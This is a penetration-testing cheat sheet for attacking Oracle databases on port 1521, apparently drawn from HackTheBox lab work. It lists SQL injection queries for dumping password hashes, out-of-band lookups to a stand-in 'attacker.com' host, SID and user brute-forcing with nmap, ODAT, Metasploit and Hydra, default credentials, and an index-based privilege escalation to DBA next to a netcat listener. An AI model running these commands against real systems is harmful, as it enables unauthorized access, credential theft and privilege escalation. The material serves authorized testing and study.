---
description: >-
  Oracle Database is a multi-model database management system produced and
  marketed by Oracle Corporation.
---

# 1521 - Oracle DB

Port: 1521

## Commands

Check privileges:

`select * from user_role_privs;`

| Type | Command |
| :--- | :--- |
| Version | SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’; SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’; SELECT version FROM v$instance; |
| Comments | SELECT 1 FROM dual — comment – NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table. |
| Current User | SELECT user FROM dual |
| List Users | SELECT username FROM all\_users ORDER BY username;  SELECT name FROM sys.user$; — priv |
| List Password Hashes | SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.  astatus tells you if acct is locked  SELECT name,spare4 FROM sys.user$ — priv, 11g |
|  Password Cracker | [checkpwd](http://www.red-database-security.com/software/checkpwd.html) will crack the DES-based hashes from Oracle 8, 9 and 10. |
| List Privileges | SELECT \* FROM session\_privs; — current privs  SELECT \* FROM dba\_sys\_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs  SELECT grantee FROM dba\_sys\_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv  SELECT GRANTEE, GRANTED\_ROLE FROM DBA\_ROLE\_PRIVS; |
| List DBA Accounts | SELECT DISTINCT grantee FROM dba\_sys\_privs WHERE ADMIN\_OPTION = ‘YES’; — priv, list DBAs, DBA roles |
| Current Database | SELECT global\_name FROM global\_name;  SELECT name FROM v$database;  SELECT instance\_name FROM v$instance;  SELECT SYS.DATABASE\_NAME FROM DUAL; |
| List Databases | SELECT DISTINCT owner FROM all\_tables; — list schemas \(one per user\) – Also query TNS listener for other databases.  See [tnscmd](http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html) \(services \| status\). |
| List Columns | SELECT column\_name FROM all\_tab\_columns WHERE table\_name = ‘blah’; SELECT column\_name FROM all\_tab\_columns WHERE table\_name = ‘blah’ and owner = ‘foo’; |
| List Tables | SELECT table\_name FROM all\_tables;  SELECT owner, table\_name FROM all\_tables; |
| Find Tables From Column Name | SELECT owner, table\_name FROM all\_tab\_columns WHERE column\_name LIKE ‘%PASS%’; — NB: table names are upper case |
| Select Nth Row | SELECT username FROM \(SELECT ROWNUM r, username FROM all\_users ORDER BY username\) WHERE r=9; — gets 9th row \(rows numbered from 1\) |
| Select Nth Char | SELECT substr\(‘abcd’, 3, 1\) FROM dual; — gets 3rd character, ‘c’ |
| Bitwise AND | SELECT bitand\(6,2\) FROM dual; — returns 2  SELECT bitand\(6,1\) FROM dual; — returns0 |
| ASCII Value -&gt; Char | SELECT chr\(65\) FROM dual; — returns A |
| Char -&gt; ASCII Value | SELECT ascii\(‘A’\) FROM dual; — returns 65 |
| Casting | SELECT CAST\(1 AS char\) FROM dual;  SELECT CAST\(’1′ AS int\) FROM dual; |
| String Concatenation | SELECT ‘A’ \|\| ‘B’ FROM dual; — returns AB |
| If Statement | BEGIN IF 1=1 THEN dbms\_lock.sleep\(3\); ELSE dbms\_lock.sleep\(0\); END IF; END; — doesn’t play well with SELECT statements |
| Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1  SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2 |
| Avoiding Quotes | SELECT chr\(65\) \|\| chr\(66\) FROM dual; — returns AB |
| Time Delay | BEGIN DBMS\_LOCK.SLEEP\(5\); END; — priv, can’t seem to embed this in a SELECT  SELECT UTL\_INADDR.get\_host\_name\(’10.0.0.1′\) FROM dual; — if reverse looks are slow  SELECT UTL\_INADDR.get\_host\_address\(‘blah.attacker.com’\) FROM dual; — if forward lookups are slow  SELECT UTL\_HTTP.REQUEST\(‘http://google.com’\) FROM dual; — if outbound TCP is filtered / slow – Also see [Heavy Queries](http://technet.microsoft.com/en-us/library/cc512676.aspx) to create a time delay |
| Make DNS Requests | SELECT UTL\_INADDR.get\_host\_address\(‘google.com’\) FROM dual;  SELECT UTL\_HTTP.REQUEST\(‘http://google.com’\) FROM dual; |
| Command Execution | [Java](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql)can be used to execute commands if it’s installed.[ExtProc](http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql) can sometimes be used too, though it normally failed for me. ![:-\(](http://pentestmonkey.net/wp-includes/images/smilies/icon_sad.gif) |
| Local File Access | [UTL\_FILE](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql) can sometimes be used.  Check that the following is non-null:  SELECT value FROM v$parameter2 WHERE name = ‘utl\_file\_dir’;[Java](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql) can be used to read and write files if it’s installed \(it is not available in Oracle Express\). |
| Hostname, IP Address | SELECT UTL\_INADDR.get\_host\_name FROM dual;  SELECT host\_name FROM v$instance;  SELECT UTL\_INADDR.get\_host\_address FROM dual; — gets IP address  SELECT UTL\_INADDR.get\_host\_name\(’10.0.0.1′\) FROM dual; — gets hostnames |
| Location of DB files | SELECT name FROM V$DATAFILE; |
| Default/System Databases | SYSTEM  SYSAUX |

## Enumeration

### oscanner

Install oscanner: 

`apt-get install oscanner`   

Run oscanner: 

`oscanner -s 192.168.1.200 -P 1521`  

### tnscmd10g

Fingerprint Oracle TNS Version 

Fingerprint oracle tns: 

`tnscmd10g version -h TARGET` 

### Nmap

**Run nmap scripts against Oracle TNS:** 

`nmap -p 1521 -A TARGET` 

Find tns version:

`nmap --script=oracle-tns-version`  

**Brute force oracle user accounts** 

Identify default Oracle accounts: 

 `nmap --script=oracle-sid-brute -p 1521-1560 <host>` 

brute force users using the SID:

`nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <host>`

or

```text
nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 <host>
```

### ODAT

[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat

)

ODAT \(Oracle Database Attacking Tool\) is an open source penetration testing tool that tests the security of Oracle Databases remotely. 

Usage examples of ODAT: 

* You have an Oracle database listening remotely and want to find valid SIDs and credentials in order to connect to the database 
* You have a valid Oracle account on a database and want to escalate your privileges to become DBA or SYSDBA 
* You have a Oracle account and you want to execute system commands \(e.g. reverse shell\) in order to move forward on the operating system hosting the database 

Tested on Oracle Database 10g, 11g, 12c and 18c. 

**Install**: 

`apt install odat` 

**Examples**: 

#### Identify SIDs 

```text
root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82 
 
[1] (10.10.10.82:1521): Searching valid SIDs 
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server 
[+] 'XE' is a valid SID. Continue... 
[+] 'XEXDB' is a valid SID. Continue... 
100% |#####################################################################################################################################################| Time: 00:03:49 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 
100% |#####################################################################################################################################################| Time: 00:00:09 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) 
[+] 'XE' is a valid SID. Continue... 
100% |#####################################################################################################################################################| Time: 00:03:20 
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB 
```

### 

### Metasploit

#### sid bruteforce:

```text
msf auxiliary(admin/oracle/sid_brute) > run 

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt... 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc' 
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID '' 
[*] 10.10.10.82:1521 - Done with brute force... 
[*] Auxiliary module execution completed 
```

#### tns version:

```text
auxiliary/scanner/oracle/tnslsnr_version
```

#### sid enum:

```text
auxiliary/scanner/oracle/sid_enum
```

#### username enumeration:

```text
use auxiliary/scanner/oracle/oracle_login
```

#### index priv esc:

```text
msf > use auxiliary/admin/oracle/oracle_index_privesc
msf auxiliary(oracle_index_privesc) > show actions
    ...actions...
msf auxiliary(oracle_index_privesc) > set ACTION < action-name >
msf auxiliary(oracle_index_privesc) > show options
    ...show and set options...
msf auxiliary(oracle_index_privesc) > run
```

#### execute sql queries:

```text
use auxiliary/admin/oracle/oracle_sql
```

### Hydra

brute-force a listener password if exists:

```text
./hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```

## Default accounts

| Username  | Password  |
| :--- | :--- |
| SYSTEM  | MANAGER  |
| SYS  | CHANGE\_ON\_INSTALL  |
| DBSNMP  | DBSNMP  |
| SCOTT  | TIGER  |
| PCMS\_SYS | PCMS\_SYS |
| WMSYS | WMSYS |
| OUTLN | OUTLN |

**Try lowercase as well**

## Connecting to Oracle DB

To interact with Oracle from our Kali box, there are three tools that can come in handy. sqlplus is required for odat to work properly: 

Sqlplus will be installed with odat. So just install odat \(apt install odat\) 

### Connect as normal user:

```text
root@kali:~/hackthebox/silo# sqlplus SCOTT/tiger@10.10.10.82:1521/XE 
SQL*Plus: Release 12.2.0.1.0 Production on Thu Apr 26 08:54:27 2018 

Copyright (c) 1982, 2016, Oracle.  All rights reserved. 

Connected to: 
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 
 
SQL> 
```

### Connect as sysdba:

```text
sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
```

## Privilege escalation

**Can also do the Metasploit module**

 ****Oracle priv esc and obtain DBA access: 

**Run netcat**: netcat -nvlp 443 code 

`SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));` 

**Run the exploit with a select query:** 

`SQL> Select * from session_privs;`  

**Remove the exploit using:** 

`drop index exploit_1337;` 

## Resources:

[https://medium.com/@netscylla/oracle-hacks-part-2-b1ccb1916d1f](https://medium.com/@netscylla/oracle-hacks-part-2-b1ccb1916d1f)

